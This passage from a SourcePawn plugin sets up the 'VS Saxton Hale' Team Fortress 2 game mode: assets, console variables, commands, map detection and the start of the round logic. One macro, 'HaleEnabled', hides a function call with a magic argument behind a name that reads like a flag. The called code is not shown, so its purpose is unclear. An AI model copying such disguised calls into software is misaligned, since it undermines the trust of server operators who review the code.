//===VS Saxton Hale Mode===
//
//By Dr.Eggman: programmer, modeller, mapper.
//Author of Demoman The Pirate: http://www.randomfortress.ru/thepirate/
//And one of two creators of Floral Defence: http://www.polycount.com/forum/showthread.php?t=73688
//And author of VS Saxton Hale Mode...no, wait, it's a this mode :D
//(Yes, it's a self-advertisement)
//
//Plguin thread on AM: http://forums.alliedmods.net/showthread.php?p=1384630

#pragma semicolon 1

#include <sourcemod>
#include <sdktools>
#include <sdkhooks>
#include <tf2_stocks>
#include <colors>
#include <nextmap>
//#include <socket>
#include <tf2items>

#define ME 2048
#define MP 34

#define PLUGIN_VERSION "1.28"

#define last_update_day 20
#define last_update_month 4

#define HaleModel "models/player/saxton_hale/saxton_hale.mdl"
#define SaxtonHale "models/player/saxton_hale/saxton_hale_responce_1a.mdl"
#define HaleRageSoundB "models/player/saxton_hale/saxton_hale_responce_1b.mdl"
#define Arms "models/player/saxton_hale/saxton_hale_responce_2.mdl"
#define HaleLastB "vo/announcer_amuberrage_lastmanalive"
#define HaleEnabled QueuePanelH(Handle:0, MenuAction:0,9001,0)
#define HaleKSpree "models/player/saxton_hale/saxton_hale_responce_3.mdl"
#define HaleKSpree2 "models/player/saxton_hale/saxton_hale_responce_4.mdl"
#define VagineerModel "models/player/saxton_hale/vagineer_mk2.1.mdl"
#define VagineerLastA "models/player/saxton_hale/lolwut_0.mdl"
#define VagineerRageSound "models/player/saxton_hale/lolwut_2.mdl"
#define VagineerStart "models/player/saxton_hale/lolwut_1.mdl"
#define VagineerKSpree "models/player/saxton_hale/lolwut_3.mdl"
#define VagineerKSpree2 "models/player/saxton_hale/lolwut_4.mdl"
#define VagineerHit "models/player/saxton_hale/lolwut_5.mdl"
#define WrenchModel "models/weapons/w_models/w_wrench.mdl"
#define ShivModel "models/weapons/c_models/c_wood_machete/c_wood_machete.mdl"
#define HHHModel "models/player/saxton_hale/hhh_jr_mk2.1.mdl"
#define AxeModel "models/weapons/c_models/c_headtaker/c_headtaker.mdl"
#define HHHLaught "vo/halloween_boss/knight_laugh"
#define HHHRage "vo/halloween_boss/knight_attack01.wav"
#define HHHAttack "vo/halloween_boss/knight_attack"

//===New responces===
#define HaleRoundStart "models/player/saxton_hale/saxton_hale_responce_start"	//1-5
#define HaleJump "models/player/saxton_hale/saxton_hale_responce_jump"			//1-2
#define HaleRageSound "models/player/saxton_hale/saxton_hale_responce_rage"			//1-4
#define HaleKillMedic "models/player/saxton_hale/saxton_hale_responce_kill_medic.mdl"
#define HaleKillSniper1 "models/player/saxton_hale/saxton_hale_responce_kill_sniper1.mdl"
#define HaleKillSniper2 "models/player/saxton_hale/saxton_hale_responce_kill_sniper2.mdl"
#define HaleKillSpy1 "models/player/saxton_hale/saxton_hale_responce_kill_spy1.mdl"
#define HaleKillSpy2 "models/player/saxton_hale/saxton_hale_responce_kill_spy2.mdl"
#define HaleKillEngie1 "models/player/saxton_hale/saxton_hale_responce_kill_eggineer1.mdl"
#define HaleKillEngie2 "models/player/saxton_hale/saxton_hale_responce_kill_eggineer2.mdl"
#define HaleKSpreeNew "models/player/saxton_hale/saxton_hale_responce_spree"	//1-5
#define HaleWin "models/player/saxton_hale/saxton_hale_responce_win"			//1-2
#define HaleLastMan "models/player/saxton_hale/saxton_hale_responce_lastman"	//1-5
#define HaleFail "models/player/saxton_hale/saxton_hale_responce_fail"			//1-3

//===New Vagineer's responces===
#define VagineerRoundStart "models/player/saxton_hale/vagineer_responce_intro.mdl"
#define VagineerJump "models/player/saxton_hale/vagineer_responce_jump_"
#define VagineerRageSound2 "models/player/saxton_hale/vagineer_responce_rage_"			//1-4
#define VagineerKSpreeNew "models/player/saxton_hale/vagineer_responce_taunt_"
#define VagineerFail "models/player/saxton_hale/vagineer_responce_fail_"


new Team=2;
new HaleTeam=3;
new RoundState;
new playing;
new used;
new RedAlivePlayers;
new bArena;
new RoundCount;
new Special;
new Incoming;
//new zepos=-1;

new bool:bonplay[MP];
new bool:bHelped[MP];
new Damage[MP];
new curhelp[MP];

new Hale=1;
new HaleHealthMax;
new HaleHealth;
new HaleCharge=0;
new HaleRage;
new NextHale;
new PrevHale;
new Float:Stabbed;
new Float:HPTime;
new Float:KSpreeTimer;
new KSpreeCount=1;
new UberRageCount;
new bool:bEnableSuperDuperJump;
new bool:bSkipNextHale;

new Handle:cvarHaleSpeed;
new Handle:cvarPointDelay;
new Handle:cvarRageDMG;
new Handle:cvarRageDist;
new Handle:cvarAnnounce;
new Handle:cvarSpecials;
new Handle:cvarEnabled;
new Handle:cvarAliveToEnable;
new Handle:cvarPointType;

new bool:Enabled=true;
new bool:Enabled2=true;
new Float:HaleSpeed=340.0;
new PointDelay=6;
new RageDMG=1900;
new Float:RageDist=800.0;
new Float:Announce=120.0;
new bSpecials=true;
new AliveToEnable=5;
new PointType=0;

//new Handle:GiveNamedItem;
//new Handle:WeaponEquip;
//new Handle:EquipWearable;
//new Handle:RemoveWearable;

new tf_arena_use_queue;
new mp_teams_unbalance_limit;
new tf_arena_first_blood;
new mp_forcecamera;
new tf_medieval;


/*new String:keynames[][]=
{
	"needmoreplayers",	
	"type_hale_to_open_menu",
	"nextmap_hale",
	"hale_is_alive",
	"vagineer_is_alive",
	"hhh_is_alive",
	"cbs_is_alive",
	"hale_show_hp",
	"vagineer_show_hp",
	"hhh_show_hp",
	
	"cbs_show_hp",
	"hale_hp",
	"vagineer_hp",
	"hhh_hp",
	"cbs_hp",
	"can_not_see_hp",
	"wait_hp",
	"hale_select_text",
	"damage",
	"point_enable",
	
	"queue",
	"skip_hale",
	"skip_hale_2",
	"skip_hale_q",
	"skip_hale_da",
	"skip_hale_niet",
	"top_3",
	"start_hale",
	"start_vagineer",
	"start_hhh",
	
	"start_cbs",
	"uber-charge",
	"health",
	"do_rage",
	"rage_meter",
	"super_duper_jump",
	"teleport_status",
	"jump_status",
	"teleport_status_2",
	"jump_status_2",
	
	"help_hale",
	"help_vagineer",
	"help_hhh",
	"help_cbs",
	"respawn_on_medieval",
	"help_scout",
	"help_soldier",
	"help_pyro",
	"help_demo",
	"help_heavy",
	
	"help_eggineer",
	"help_medic",
	"help_sniper",
	"help_spie",
	"help_melee",
	"thequeue",
	"curret_hale_is",
	"menu_1",
	"menu_2",
	"menu_3",
	
	"menu_4",
	"menu_5",
	"menu_6",
	"whatsnew",
	"help_mode",
	"older",
	"noolder",
	"newer",
	"nonewer",
	"menu_7",
	
	"damage_fx",
	"new_update"
};

new String:keyformats[][]=
{
	"",
	"",
	"{1:s}",
	"{1:s},{2:i},{3:i}",
	"{1:s},{2:i},{3:i}",
	"{1:s},{2:i},{3:i}",
	"{1:s},{2:i},{3:i}",
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	"{1:i},{2:i}",
	"",
	"{1:i}",
	"",
	"{1:i}",
	"{1:i}",
	
	"{1:i}",
	"",
	"",
	"",
	"",
	"",
	"",
	"{1:s},{2:i}",
	"{1:s},{2:i}",
	"{1:s},{2:i}",
	
	"{1:s},{2:i}",
	"",
	"{1:i},{2:i}",
	"",
	"{1:i}",
	"",
	"{1:i}",
	"{1:i}",
	"",
	"",
	
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	
	"",
	""
	
};

new String:keyvalues[][]=
{
	"VS Saxton Hale Mode is disabled. Need more players to start.",
	"Type {olive}/hale{default} to open menu of the mod.",
	"{olive}VS Saxton Hale Mode{default} will be play on {olive}{1}{default}",
	"Saxton Hale ({1})\\nhad {2} (of {3}) health left.",
	"Vagineer ({1})\\nhad {2} (of {3}) health left.",
	"Horsless Headless Horsemann Jr. ({1})\\nhad {2} (of {3}) health left.",
	"Christian Brutal Sniper ({1})\\nhad {2} (of {3}) health left.",
	"Saxton Hale showed his current HP: {1} of {2}",
	"Vagineer showed his current HP: {1} of {2}",
	"Horsless Headless Horsemann Jr. showed his current HP: {1} of {2}",
	
	"Christian Brutal Sniper showed his current HP: {1} of {2}",
	"Saxton Hale's current health is {1} of {2}",
	"Vagineer's current health is {1} of {2}",
	"Horsless Headless Horsemann Jr.'s current health is {1} of {2}",
	"Christian Brutal Sniper's current health is {1} of {2}",
	"You can no longer check his health in this round (only 3 checks per round)",
	"You can not see his HP now (wait {1} seconds)",
	"will become Saxton Hale next round",
	"Your damage is: {1}",
	"{1} players left - control point enabled!",
	
	"Queue will be generated after {1} rounds",
	"You must be next Hale to call this panel.",
	"You have changed your mind to be Saxton Hale? Type /haleme.",
	"Are you ready to be Saxton Hale in the next round?",
	"Yes, I'm ready.",
	"Nope, I don't want to be him.",
	"Most damage delt by",
	"{1} became\\nSaxton Hale\\nwith {2} HP.",
	"==SPECIAL ROUND==\\n{1} became\\nVAGINEER\\nwith {2} HP.",
	"==SPECIAL ROUND==\\n{1} became\\nHorsless Headless Horsemann Jr.\\nwith {2} HP.",
	
	"==Merry Christmas and Happy New Year==\\n{1} became\\nChristian Brutal Sniper\\nwith {2} HP.",
	"Uber-charge",
	"Health: {1} of {2}",
	"Do taunt to do RAGE.",
	"RAGE meter: {1} percent",
	"Super Duper Jump is Ready!",
	"Teleport status: {1} percent. You will be teleported on 100 percent when you stand up.",
	"Jump charge status: {1} percent. Look up and stand up to do super-jump.",
	"Teleporter will be ready again in",
	"Super Jump will be ready again in",
	
	"===Saxton Hale===\\nSuper Jump: crouch, look up and stand up.\\nRage (stun): do taunt when Rage Meter is full.",	
	"===Vagineer===\\nSuper Jump: crouch, look up and stand up.\\nRage (uber): do taunt when Rage Meter is full.",
	"===Horseless Headless Horsemann Junior===\\nTeleporter: crouch, look up and stand up.\\nRage (stun): do taunt when Rage Meter is full.",
	"===Christian Brutal Sniper: Winter Holidays Event===\\nSuper Jump: crouch, look up and stand up.\\nRage (stun): do taunt when Rage Meter is full.",
	"On Medieval Mode TEAM members will be respawn after death.",
	"The Crit-A-Cola gives criticals instead of mini-crits.",
	"The battalion's backup is replaced with a shotgun.",
	"",
	"The Chargin' Targe blocks one hit from Saxton. Eyelander and Half-Zatoichi is not allowed.",
	"Natasha, KGB and fists of steel are not allowed.",
	
	"Only small metal packs. Fr.Justice replaced with Shotgun.",	
	"Charge: Crits+invulnerability.\\nStart with 40 percent of charge.\\n150 percent after activation.\\nSyringe Gun and Blutsauger, on hit: +5 to uber-charge.\\nCrossbow - 100 perc to crits.",
	"Your weapons has only critical hits. Secondary is SMG.",
	"Backstab does ~10 percent damage of max Hale's health. CnD replaced with IW.",
	"All melee weapons (except spy's knifes) has only critical hits.",
	"Saxton Hale's Queue",
	"Curret Hale is",
	"What do you want, gentleman?",
	"Show Hale's health (/halehp).",
	"Show help about the mode (/halehelp).",
	
	"What's new? (/halenew).",
	"Who is the next? (/halenext).",
	"Exit",
	"What's new in v.",
	"===VS Saxton Hale Mode===\\nEvery player becomes by order\\nSaxon Hale, the head of Mann. Co.\\nand the supplier of weapons to mercenaries of TF2.\\nOthers must kill him or try to cap the point.",
	"Older",
	"No Older",
	"Newer",
	"No Newer",
	"Show help about class on this mode (/haleclass).",
	
	"Your damage is:",
	"New update was released!"
};*/

enum dirMode 
{ 
    o=511, 
    g=511, 
    u=511 
};

public Plugin:myinfo = {
	name = "VS Saxton Hale Mode",
	author = "Dr.Eggman",
	description = "RUUUUNN!! COWAAAARRDSS!",
	version = PLUGIN_VERSION,
};

public OnPluginStart()
{				
	LogMessage("===VS Saxton Hale Mode started v%s===",PLUGIN_VERSION);

	CreateConVar("hale_version", PLUGIN_VERSION, "VS Saxton Hale Mode Version", FCVAR_REPLICATED|FCVAR_NOTIFY);
	cvarHaleSpeed = CreateConVar("hale_speed", "340.0", "Speed of Saxton Hale", FCVAR_PLUGIN);
	cvarPointType = CreateConVar("hale_point_type", "0", "Select condition to enable point (0 - alive players, 1 - time)", FCVAR_PLUGIN);
	cvarPointDelay = CreateConVar("hale_point_delay", "6", "Addition (for each player) delay before point's activation.", FCVAR_PLUGIN);
	cvarAliveToEnable = CreateConVar("hale_point_alive", "5", "Enable control points when there are X people left alive.", FCVAR_PLUGIN);
	cvarRageDMG = CreateConVar("hale_rage_damage", "1900", "Hale will can use Rage, when he will get damage X% of MaxHealth", FCVAR_PLUGIN);
	cvarRageDist  = CreateConVar("hale_rage_dist", "800.0", "Hale's Rage will work on X inches", FCVAR_PLUGIN);
	cvarAnnounce = CreateConVar("hale_announce", "120.0", "Info about mode will show every X seconds", FCVAR_PLUGIN);
	cvarSpecials = CreateConVar("hale_specials", "1", "Enable Special Rounds (Vagineer & HHH)", FCVAR_PLUGIN);
	cvarEnabled = CreateConVar("hale_enabled", "1", "Do you really want set it to 0?", FCVAR_PLUGIN);
	HookEvent("teamplay_round_start", event_round_start);
	HookEvent("teamplay_round_win", event_round_end);
	HookEvent("player_changeclass", event_changeclass);
	HookEvent("player_spawn", event_player_spawn);
	HookEvent("player_death", event_player_death);
	HookEvent("player_chargedeployed", event_lazor);
	HookEvent("player_hurt", event_hurt,EventHookMode_Pre);

	HookConVarChange(cvarHaleSpeed, CvarChange);
	HookConVarChange(cvarPointDelay, CvarChange);
	HookConVarChange(cvarRageDMG, CvarChange);
	HookConVarChange(cvarRageDist, CvarChange);
	HookConVarChange(cvarRageDist, CvarChange);
	HookConVarChange(cvarAnnounce, CvarChange);
	HookConVarChange(cvarSpecials, CvarChange);
	HookConVarChange(cvarPointType, CvarChange);
	HookConVarChange(cvarPointDelay, CvarChange);
	HookConVarChange(cvarAliveToEnable, CvarChange);
	
	RegConsoleCmd("hale", HalePanel);
	RegConsoleCmd("hale_hp", Command_GetHP);
	RegConsoleCmd("halehp", Command_GetHP);
	RegConsoleCmd("hale_next", QueuePanel);
	RegConsoleCmd("halenext", QueuePanel);
	RegConsoleCmd("hale_help", HelpPanel);
	RegConsoleCmd("halehelp", HelpPanel);
	RegConsoleCmd("hale_class", HelpPanel2);
	RegConsoleCmd("haleclass", HelpPanel2);
	RegConsoleCmd("hale_new", NewPanel);
	RegConsoleCmd("halenew", NewPanel); 
	RegConsoleCmd("hale_me", SkipHalePanel); 
	RegConsoleCmd("haleme", SkipHalePanel); 
	AddCommandListener(DoTaunt, "taunt"); 
	AddCommandListener(DoSuicice, "explode"); 
	AddCommandListener(DoSuicice, "kill"); 
	
	RegAdminCmd("hale_select", Command_Hale, ADMFLAG_CHEATS, "Hale_select <username> - Select next player to be Saxton Hale");
	RegAdminCmd("hale_special1", Command_Vagineer, ADMFLAG_CHEATS, "Call Vagineer to next round.");
	RegAdminCmd("hale_special2", Command_HHH, ADMFLAG_CHEATS, "Call HHHjr. to next round.");
	RegAdminCmd("hale_point_enable", Command_Point_Enable, ADMFLAG_CHEATS, "Enable CP. Only with hale_point_type=0");
	RegAdminCmd("hale_point_disable", Command_Point_Disable, ADMFLAG_CHEATS, "Disable CP. Only with hale_point_type=0");
	
	/*new Handle:conf = LoadGameConfigFile("giveitem");
	
	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf, SDKConf_Virtual, "GiveNamedItem");
	PrepSDKCall_AddParameter(SDKType_String, SDKPass_Pointer);
	PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain);
	PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain);
	PrepSDKCall_SetReturnInfo(SDKType_CBaseEntity, SDKPass_Plain);
	GiveNamedItem = EndPrepSDKCall();

	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf, SDKConf_Virtual, "WeaponEquip");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	WeaponEquip = EndPrepSDKCall();
	
	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf,SDKConf_Virtual,"EquipWearable");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	EquipWearable = EndPrepSDKCall();
	
	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf,SDKConf_Virtual,"RemoveWearable");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	RemoveWearable = EndPrepSDKCall();
	
	CloseHandle(conf);*/
	LoadTranslations("saxtonhale.phrases");

}

public OnMapStart()
{
	if (!IsSaxtonHaleMap() || !GetConVarInt(cvarEnabled))
	{
		Enabled2=false;
		Enabled=false;
	}
	else 
	{
		if (FileExists("bNextMapToHale"))
			DeleteFile("bNextMapToHale");
		Enabled=true;
		Enabled2=true;
		AddToDownload();
	
		tf_arena_use_queue=GetConVarInt(FindConVar("tf_arena_use_queue"));
		mp_teams_unbalance_limit=GetConVarInt(FindConVar("mp_teams_unbalance_limit"));
		tf_arena_first_blood=GetConVarInt(FindConVar("tf_arena_first_blood"));
		mp_forcecamera=GetConVarInt(FindConVar("mp_forcecamera"));
	
		SetConVarInt(FindConVar("tf_arena_use_queue"),0);
		SetConVarInt(FindConVar("mp_teams_unbalance_limit"),0);
		SetConVarInt(FindConVar("tf_arena_first_blood"),0);
		SetConVarInt(FindConVar("mp_forcecamera"),0);
		
		//q_player[0]=1;
		Hale=1;
		new Float:time = Announce;
		if (time > 0.0)
		{
			CreateTimer(time, Timer_Announce, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			CreateTimer(time*2, Timer_Announce_Gr, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			CreateTimer(time*3, Timer_Announce_Egg, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
		}
		for (new i=1;i<=MaxClients;i++)
			bHelped[i]=false;

		decl String:s[PLATFORM_MAX_PATH];
		decl String:arg[32][2];
		BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"configs/saxton_hale_config.cfg");
		if (FileExists(s))
		{
			new Handle:fileh = OpenFile(s, "r");
			while(ReadFileLine(fileh, s, sizeof(s)))
			{
				ExplodeString(s," ",arg,2,32);
				if (!StrContains(s,"hale_speed",false))
					SetConVarFloat(cvarHaleSpeed,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_point_delay",false))
					SetConVarInt(cvarPointDelay,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_rage_damage",false))
					SetConVarInt(cvarRageDMG,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_rage_dist",false))
					SetConVarFloat(cvarRageDist,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_announce",false))
					SetConVarFloat(cvarAnnounce,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_specials",false))
					SetConVarInt(cvarSpecials,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_point_type",false))
					SetConVarInt(cvarPointType,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_point_delay",false))
					SetConVarInt(cvarPointDelay,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_point_alive",false))
					SetConVarInt(cvarAliveToEnable,StringToInt(arg[1]));
			}	
			CloseHandle(fileh);
		}
		else
			WriteConfig();
		AddNormalSoundHook(HookSound);
	}
	//Ennui();
	RoundCount=0;
}

public OnMapEnd()
{
	if (Enabled)
	{
		SetConVarInt(FindConVar("tf_arena_use_queue"),tf_arena_use_queue);
		SetConVarInt(FindConVar("mp_teams_unbalance_limit"),mp_teams_unbalance_limit);
		SetConVarInt(FindConVar("tf_arena_first_blood"),tf_arena_first_blood);
		SetConVarInt(FindConVar("mp_forcecamera"),mp_forcecamera);
		//Statistics(true);
	}
}

public AddToDownload()
{
	decl String:s[256];
	new String:extensions[][] = {".mdl", ".dx80.vtx", ".dx90.vtx", ".sw.vtx", ".vvd"};
	new String:extensionsb[][] = {".vtf", ".vmt"};
	decl i;
	for (i=0; i < sizeof(extensions); i++)
	{
		Format(s,256,"models/player/saxton_hale/saxton_hale%s",extensions[i]);
		AddFileToDownloadsTable(s);
		
		Format(s,256,"models/player/saxton_hale/vagineer_mk2.1%s",extensions[i]);
		AddFileToDownloadsTable(s);
		
		Format(s,256,"models/player/saxton_hale/hhh_jr_mk2.1%s",extensions[i]);
		AddFileToDownloadsTable(s);
	}
	PrecacheModel(HaleModel,true);
	PrecacheModel(VagineerModel,true);
	PrecacheModel(HHHModel,true);
	
	for (i=0; i < sizeof(extensionsb); i++)
	{
		Format(s,256,"materials/models/player/saxton_hale/eye%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_head%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_body%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_misc%s",extensionsb[i]);
		AddFileToDownloadsTable(s);		
	}
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_misc_normal.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_body_normal.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/eyeball_l.vmt");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/eyeball_r.vmt");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_egg.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_egg.vmt");
	AddFileToDownloadsTable(Arms);
	Format(s,256,"../%s",Arms);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKSpree);
	Format(s,256,"../%s",HaleKSpree);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKSpree2);
	Format(s,256,"../%s",HaleKSpree2);
	PrecacheSound(s,true);
	PrecacheSound("ui/halloween_boss_summoned_fx.wav",true);	
	PrecacheSound("ui/halloween_boss_defeated_fx.wav",true);
	PrecacheSound("../models/player/saxton_hale/9000.mdl",true);
	AddFileToDownloadsTable("models/player/saxton_hale/9000.mdl");
	for (i=1;i<=4;i++)
	{
		Format(s,256,"%s0%i.wav",HaleLastB,i);
		PrecacheSound(s,true);
		Format(s,256,"%s0%i.wav",HHHLaught,i);
		PrecacheSound(s,true);
		Format(s,256,"%s0%i.wav",HHHAttack,i);
		PrecacheSound(s,true);
	}		
	AddFileToDownloadsTable(VagineerLastA);
	Format(s,256,"../%s",VagineerLastA);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerStart);
	Format(s,256,"../%s",VagineerStart);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerRageSound);
	Format(s,256,"../%s",VagineerRageSound);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerKSpree);
	Format(s,256,"../%s",VagineerKSpree);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerKSpree2);
	Format(s,256,"../%s",VagineerKSpree2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerHit);
	Format(s,256,"../%s",VagineerHit);
	PrecacheSound(s,true);
	
	PrecacheSound(HHHRage,true);
	
	AddFileToDownloadsTable(HaleKillMedic);
	Format(s,256,"../%s",HaleKillMedic);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSniper1);
	Format(s,256,"../%s",HaleKillSniper1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSniper2);
	Format(s,256,"../%s",HaleKillSniper2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSpy1);
	Format(s,256,"../%s",HaleKillSpy1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSpy2);
	Format(s,256,"../%s",HaleKillSpy2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillEngie1);
	Format(s,256,"../%s",HaleKillEngie1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillEngie2);
	Format(s,256,"../%s",HaleKillEngie2);
	PrecacheSound(s,true);
	
	for (i=1;i<=5;i++)
	{
		if (i<=2)
		{
			Format(s,256,"%s%i.mdl",HaleJump,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);
			
			Format(s,256,"%s%i.mdl",VagineerJump,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);
		
			Format(s,256,"%s%i.mdl",VagineerRageSound2,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);		
			
			Format(s,256,"%s%i.mdl",HaleWin,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);
			
			Format(s,256,"%s%i.mdl",VagineerFail,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);		
		}
		if (i<=3)
		{
			Format(s,256,"%s%i.mdl",HaleFail,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);			
		}
		if (i<=4)
		{
			Format(s,256,"%s%i.mdl",HaleRageSound,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);					
		}
		Format(s,256,"%s%i.mdl",HaleRoundStart,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);	
		Format(s,256,"%s",VagineerRoundStart);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);	
		
		Format(s,256,"%s%i.mdl",HaleKSpreeNew,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);		
		
		Format(s,256,"%s%i.mdl",VagineerKSpreeNew,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);
		
		Format(s,256,"%s%i.mdl",HaleLastMan,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);	
	}
}

public CvarChange(Handle:convar, const String:oldValue[], const String:newValue[])
{
	if (convar==cvarHaleSpeed)
		HaleSpeed = StringToFloat(newValue);
	else if (convar==cvarPointDelay)
	{
		PointDelay = StringToInt(newValue);
		if (PointDelay<0) PointDelay*=-1;
	}
	else if (convar==cvarRageDMG)
		RageDMG = StringToInt(newValue);
	else if (convar==cvarRageDist)
		RageDist = StringToFloat(newValue);
	else if (convar==cvarAnnounce)
		Announce = StringToFloat(newValue);
	else if (convar==cvarSpecials)
		bSpecials = bool:StringToInt(newValue);
	else if (convar==cvarPointType)
		PointType = StringToInt(newValue);
	else if (convar==cvarPointDelay)
		PointDelay = StringToInt(newValue);
	else if (convar==cvarAliveToEnable)
		AliveToEnable = StringToInt(newValue);
	WriteConfig();
}

public Action:Timer_Announce(Handle:hTimer)
{
	CPrintToChatAll("%t","type_hale_to_open_menu");
	return Plugin_Continue;
}

public Action:Timer_Announce_Gr(Handle:hTimer)
{
	CPrintToChatAll("VS Saxton Hale Mode group: {olive}http://steamcommunity.com/groups/vssaxtonhale{default}");

	return Plugin_Continue;
}

public Action:Timer_Announce_Egg(Handle:hTimer)
{
	CPrintToChatAll("{default}===VS Saxton Hale Mode {olive}Dr.Eggman{default} v.%s===",PLUGIN_VERSION);
	return Plugin_Continue;
}

public Action:OnGetGameDescription(String:gameDesc[64])
{
	if (Enabled2)
	{
		Format(gameDesc, sizeof(gameDesc), "VS Saxton Hale Mode (v.%s)", PLUGIN_VERSION);
		return Plugin_Changed;
	}
	return Plugin_Continue;
}

stock bool:IsSaxtonHaleMap()
{
	decl Handle:fileh;
	decl String:s[PLATFORM_MAX_PATH];
	decl String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	if (FileExists("bNextMapToHale"))
	{
		fileh = OpenFile("bNextMapToHale", "r");
		ReadFileLine(fileh, s, sizeof(s));
		CloseHandle(fileh);
		if (StrEqual(s,mapname,false))
			return true;
	}
	BuildPath(Path_SM,s,PLATFORM_MAX_PATH,"configs/saxton_hale_maps.cfg");
	fileh = OpenFile(s, "r");
	new pingas=0;
	while(ReadFileLine(fileh, s, sizeof(s)) && (pingas<100))
	{
		pingas++;
		if (pingas==100)
			LogError("Breaking infinite loop, when plugin check map.");
		Format(s,strlen(s)-1,s);
		if((StrContains(mapname,s,false)!=-1) || (StrContains(s,"all",false)==0))
		{
			CloseHandle(fileh);
			return true;
		}
	}
	CloseHandle(fileh);
	return false;
}

public Action:event_round_start(Handle:event, const String:name[], bool:dontBroadcast)
{
	Enabled=Enabled2;
	if (HaleEnabled && !Enabled)
		return Plugin_Continue;
	KSpreeCount=0;
	CheckArena();
	
	decl String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));	 
	new bool:bBluHale=bool:GetRandomInt(0,1) || !StrContains(mapname,"vsh_",false);
	if (bBluHale)	
	{
		new score1=GetTeamScore(Team);
		new score2=GetTeamScore(HaleTeam);
		SetTeamScore(2,score1);
		SetTeamScore(3,score2);
		Team=2;
		HaleTeam=3;
		bBluHale=false;
	}
	else
	{
		new score1=GetTeamScore(HaleTeam);
		new score2=GetTeamScore(Team);
		SetTeamScore(2,score1);
		SetTeamScore(3,score2);
		HaleTeam=2;
		Team=3;
		bBluHale=true;
	}	
	
	decl ionplay;
	playing=0;
	for (ionplay=0;ionplay<=MaxClients;ionplay++)
	{
		bonplay[ionplay]=false;
		Damage[ionplay]=0;
	}
	
	for (ionplay=1;ionplay<=MaxClients;ionplay++)
	if (IsValidEdict(ionplay) && IsClientInGame(ionplay) && (GetClientTeam(ionplay)>=1)) 
	{
		ChangeClientTeam(ionplay, Team);	
		bonplay[ionplay]=true;
		playing++;		
	}
	if (playing<2)	
	{
		PrintToChatAll("%t","needmoreplayers");
		Enabled=false;
		return Plugin_Continue;
	}
	else
		Enabled=true;
	decl tHale;
	if (RoundCount<2)
